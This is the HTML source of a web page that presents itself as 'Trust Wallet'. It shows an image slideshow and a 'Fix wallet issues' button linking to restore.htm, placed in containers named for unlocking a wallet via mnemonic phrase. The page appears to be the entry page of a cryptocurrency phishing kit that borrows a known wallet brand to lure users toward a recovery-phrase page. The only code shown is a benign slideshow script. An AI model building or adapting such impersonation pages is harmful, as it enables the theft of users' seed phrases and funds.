<html lang="en">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">


    <meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no">
    <meta name="theme-color" content="#000000">
    <!-- <link rel="manifest" href="currencycss/manifest.json"> -->

    <link rel="shortcut icon" href="currencycss/logo.png" />

    <title>Best Cryptocurrency Wallet | Ethereum Wallet | ERC20 Wallet | Trust Wallet</title>
    <link href="./currencycss/main_index.css" rel="stylesheet">

</head>

<body>

    <div id="root">
        <div class="App">

            <div class="slideshow-container">

                <div class="mySlides fade" style="display: block;">

                    <img src="./currencycss/slide1.jpg" style="width:100%">
                </div>

                <div class="mySlides fade" style="display: none;">

                    <img src="./currencycss/slide2.jpg" style="width:100%">

                </div>

                <div class="mySlides fade" style="display: none;">

                    <img src="./currencycss/slide3.jpg" style="width:100%">

                </div>

                <a class="prev" onclick="plusSlides(-1)">❮</a>
                <a class="next" onclick="plusSlides(1)">❯</a>

            </div>
            <br>

            <div style="text-align:center">
                <span class="dot active" onclick="currentSlide(1)"></span>
                <span class="dot" onclick="currentSlide(2)"></span>
                <span class="dot" onclick="currentSlide(3)"></span>
            </div>



            <div class="Pages">
                <div class="UnlockWalletPage">
                    <div class="UnlockWalletPage__wrapper">
                        <!--<div class="UnlockWalletPage__title box">

</div>-->
                        <div class="UnlockWalletCard">
                            <div class="UnlockWalletCard__content">
                                <div class="UnlockWalletCard__header">

                                </div>

                                <div class="UnlockWalletViaMnemonicPhrase">

                                    <div class="UnlockWalletViaMnemonicPhrase__footer">
                                        <button type="submit" name="submit" style="width:100%;" class="GradientButton undefined GradientButton">
	<a href="restore.htm" class="GradientButton__title">Fix wallet issues</a></button></div>

                                </div>
                            </div>



                            <script>
                                let slideIndex = 1;
                                showSlides(slideIndex);

                                function plusSlides(n) {
                                    showSlides(slideIndex += n);
                                }

                                function currentSlide(n) {
                                    showSlides(slideIndex = n);
                                }

                                function showSlides(n) {
                                    let i;
                                    let slides = document.getElementsByClassName("mySlides");
                                    let dots = document.getElementsByClassName("dot");
                                    if (n > slides.length) {
                                        slideIndex = 1
                                    }
                                    if (n < 1) {
                                        slideIndex = slides.length
                                    }
                                    for (i = 0; i < slides.length; i++) {
                                        slides[i].style.display = "none";
                                    }
                                    for (i = 0; i < dots.length; i++) {
                                        dots[i].className = dots[i].className.replace(" active", "");
                                    }
                                    slides[slideIndex - 1].style.display = "block";
                                    dots[slideIndex - 1].className += " active";
                                }
                            </script>




                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</body>

</html>
